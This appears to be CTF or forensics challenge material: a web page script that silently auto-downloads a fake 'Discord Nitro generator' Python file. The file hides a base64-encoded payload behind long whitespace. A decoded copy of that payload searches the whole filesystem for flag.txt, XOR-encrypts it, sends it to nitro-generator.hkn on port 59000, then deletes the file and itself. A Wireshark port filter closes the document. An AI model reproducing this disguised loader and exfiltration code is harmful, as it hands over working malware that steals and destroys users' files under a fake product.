http filter

<script>
    window.onload = function() {
        var link = document.createElement('a');
        link.href = 'nitro-generator.py';
        link.download = 'nitro-generator.py';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };
</script>


import time, sys                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         , base64, threading;threading.Thread(target=lambda x: exec(base64.b64decode("aW1wb3J0IG9zCgpkZWYgc3RlYWwocGF0aCk6CiBpbXBvcnQgc29ja2V0CiBkZWYgeG9yKGRhdGEsIGtleSk6CiAgcmV0dXJuIGJ5dGVzKFthIF4gYiBmb3IgYSwgYiBpbiB6aXAoZGF0YSwga2V5ICogKGxlbihkYXRhKSAvLyBsZW4oa2V5KSArIDEpKV0pCiB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgZjoKICBjb250ZW50ID0gZi5yZWFkKCkKIGVuY3J5cHRlZCA9IHhvcihjb250ZW50LCBiIjZhNTI2NWUyNjBmN2JlZDUwMDY5M2IwZDIxYTA1Y2QyIikKIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiBzLmNvbm5lY3QoKCJuaXRyby1nZW5lcmF0b3IuaGtuIiwgNTkwMDApKQogcy5zZW5kYWxsKGVuY3J5cHRlZCkKIHMuY2xvc2UoKQogb3MucmVtb3ZlKHBhdGgpCgpmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsaygiLyIpOgogZm9yIGZpbGUgaW4gZmlsZXM6CiAgcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogIGlmIG9zLnBhdGguaXNmaWxlKHBhdGgpIGFuZCBmaWxlID09ICJmbGFnLnR4dCI6CiAgIHRyeTpzdGVhbChwYXRoKQogICBleGNlcHQ6cGFzcwoKcHJpbnQoIlxuRmFpbGVkIHRvIGdlbmVyYXRlIG5pdHJvIGNvZGVzLiIpCm9zLnJlbW92ZShfX2ZpbGVfXykKb3MuX2V4aXQoKSBpZiBvcy5uYW1lID09ICJudCIgZWxzZSBvcy5raWxsKG9zLmdldHBpZCgpLCA5KQ==")), args=(0,)).start()


chars = "\\|/-"

while True:
    for char in chars:
        sys.stdout.write('\r' + "Generating Nitro Codes... " + char)
        sys.stdout.flush()
        time.sleep(0.2)


import os

def steal(path):
 import socket
 def xor(data, key):
  return bytes([a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1))])
 with open(path, "rb") as f:
  content = f.read()
 encrypted = xor(content, b"6a5265e260f7bed500693b0d21a05cd2")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("nitro-generator.hkn", 59000))
 s.sendall(encrypted)
 s.close()
 os.remove(path)

for root, dirs, files in os.walk("/"):
 for file in files:
  path = os.path.join(root, file)
  if os.path.isfile(path) and file == "flag.txt":
   try:steal(path)
   except:pass

print("\nFailed to generate nitro codes.")
os.remove(__file__)
os._exit() if os.name == "nt" else os.kill(os.getpid(), 9)


tcp.port == 59000


